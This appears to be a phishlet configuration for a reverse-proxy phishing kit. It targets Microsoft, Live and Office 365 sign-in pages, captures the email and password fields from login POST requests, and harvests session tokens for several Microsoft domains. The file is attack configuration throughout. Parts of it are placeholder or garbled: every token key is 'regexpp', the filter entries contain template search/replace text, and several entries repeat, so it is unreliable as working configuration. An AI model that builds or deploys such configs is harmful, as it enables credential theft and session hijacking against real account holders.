min_ver: '3.2.0'
_proxy_hosts:
  - phish_sub: 'login'
    orig_sub: 'login'
    domain: 'microsoftonline.com'
    session: true
    is_landing: true
  - phish_sub: 'login'
    orig_sub: 'login'
    domain: 'live.com'
    session: true
    is_landing: false
  - phish_sub: 'www'
    orig_sub: 'www'
    domain: 'office.com'
    session: true
    is_landing: false
_sub_filters:
  - triggers: ['breakdev.org', 'orig.sub', 'academy', 'breakdev.org', 'search="something_to_look_for"', 'replace="replace_it_with_this"']
_auth_tokens:
  - domain: 'live.com'
    keys: ['^.*regexpp']
  - domain: 'live.com'
    keys: ['^.*regexpp']
  - domain: 'login.live.com'
    keys: ['^.*regexpp']
  - domain: 'login.live.com'
    keys: ['^.*regexpp']
  - domain: 'login.microsoftonline.com'
    keys: ['^.*regexpp']
  - domain: 'login.microsoftonline.com'
    keys: ['^.*regexpp']
  - domain: 'microsoft.com'
    keys: ['^.*regexpp']
  - domain: 'microsoft.com'
    keys: ['^.*regexpp']
  - domain: 'office.com'
    keys: ['^.*regexpp']
  - domain: 'office.com'
    keys: ['^.*regexpp']
_credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
_login:
  - domain: 'login.microsoftonline.com'
    path: '/'
